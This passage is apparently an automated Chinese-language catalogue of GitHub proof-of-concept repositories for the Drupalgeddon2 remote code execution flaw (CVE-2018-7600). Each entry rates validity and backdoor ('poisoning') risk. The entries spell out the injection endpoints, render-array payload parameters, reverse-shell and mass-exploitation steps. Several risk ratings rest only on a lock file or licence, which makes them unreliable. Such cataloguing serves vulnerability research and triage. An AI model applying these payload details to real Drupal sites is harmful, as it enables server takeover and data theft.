2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
